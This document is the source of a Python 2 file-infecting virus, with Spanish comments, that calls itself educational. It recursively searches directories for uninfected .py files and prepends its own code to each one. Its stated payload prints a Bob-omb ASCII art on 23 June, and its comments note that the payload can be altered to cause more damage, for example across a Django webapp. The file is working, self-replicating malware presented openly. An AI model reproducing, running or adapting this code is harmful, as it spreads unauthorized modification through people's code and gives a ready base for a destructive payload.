#!/usr/bin/python
import os
import datetime
SuperMario64 = "Bob-omb Buddy Virus de Python"

#############################################################################
#   Un pequeno virus educativo en lenguaje de alto nivel para Python muy    #
# a pesar de ser concebido para ser inofensivo, no deja de alterar todos    #
# archivos .py de su carpeta raiz y carpeta contenedoras para imprimir un   #
# lindo ASCII art el dia que se celebra el aniversario del lanzamiento de   #
# Super Mario 64 23/6/96. Mas sin embargo la funcion bombOmbBuddy() puede   #
# ser alterada para generar aun mas dano.                                   #
#############################################################################

#COMENTARIOS PARA EXPLICAR LA LOGICA.

# busqueda() crea una lista de rutas de potenciales archivos victima con extension
# .py, comprueba la existencia de una variable global para filtrar aquellos que
# han sido infectados ya y retorna la lista.
def busqueda(ruta):
    victimas = []
    listaArchivTotal = os.listdir(ruta)
    for cadaArchiv in listaArchivTotal:
        if os.path.isdir(ruta+"/"+cadaArchiv):
            victimas.extend(busqueda(ruta+"/"+cadaArchiv))
        elif cadaArchiv[-3:] == ".py":
            envirado = False
            for fila in open(ruta+"/"+cadaArchiv):
                if SuperMario64 in fila:
                    envirado = True
                    break
            if envirado == False:
                victimas.append(ruta+"/"+cadaArchiv)
    return victimas

# infectar() toma la lista de archivos victimas y uno por uno replica el codigo
# malicioso y lo antepone al codigo principal del programa para ser ejecutado
# de primero y asegurar una mayor penetracion en el momento de la ejecucion
# de cada uno de esos archivos.
def infectar (archivVictimas):
    infeccion = open(os.path.abspath(__file__))
    infeccionStr = ""
    for i,fila in enumerate(infeccion):
        if 1>=0 and i<92:
            if fila[0] == "#":
                pass
            else:
                infeccionStr += fila
    infeccion.close
    for cadaArchiv in archivVictimas:
        arch = open (cadaArchiv)
        aux = arch.read()
        arch.close()

        arch = open(cadaArchiv, "w")
        arch.write(infeccionStr + aux)
        arch.close()

# bombOmbBuddy() es nuestro inofensivo codigo malicioso, unicamente antepone un
# print al codigo original de las victimas. Basta para hacer pasar un mal rato
# modificando todos los codigos de una webapp Django por ejemplo.
# facilmente corregible, pero tan tedioso como numero de infectados tenga.
def bombOmbBuddy():

    stringBomb = """ \
                       #
                      #
                  ,--'#`--.
                  |#######|
               _.-'#######`-._
            ,-'###############`-.
           ,'#####################`,
          /#####   #########   ####\\
         |#####     #######     #####|
        |######     #######     ######|
        |#######   #########   #######|
        |#############################|
        |#############################|
         |###########################|
          \#########################/
           `.#####################,'
        ,-----`._###############_,'-----,
       |________`--..#####..--'_________|

        HI MARIO, IM A RED BOMB-OMB, HAPPY BIRTHDAY """
    if datetime.datetime.now().day == 23 and datetime.datetime.now().month == 6:
        print stringBomb

victimas = busqueda(os.path.abspath(""))
infectar(victimas)
bombOmbBuddy()
